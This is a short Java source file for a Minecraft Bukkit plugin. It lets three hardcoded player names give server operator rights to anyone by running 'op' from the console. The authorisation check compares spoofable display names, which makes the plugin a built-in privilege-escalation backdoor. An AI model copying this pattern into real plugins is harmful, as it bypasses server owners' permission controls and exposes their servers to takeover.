package ggmmo.makeop;

import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;

public class GGMMO_MakeOP extends JavaPlugin implements CommandExecutor {

    @Override
    public void onEnable() {

    }

    @Override
    public void onDisable() {

    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (sender instanceof Player) {
            Player player = (Player)sender;
            if (isSuperUser(player)) {
                if (args.length == 1)
                    getServer().dispatchCommand(getServer().getConsoleSender(), "op " + args[0]);
                    return true;
            } else {
                player.sendMessage(ChatColor.RED + "You don't have permission for that!");
                return true;
            }
        }
        return false;
    }

    private boolean isSuperUser(Player player) {
        return (player.getDisplayName().equalsIgnoreCase("intrepid249") ||
                player.getDisplayName().equalsIgnoreCase("dishonored_fox") ||
                player.getDisplayName().equalsIgnoreCase("SoundBlast3r"));
    }
}
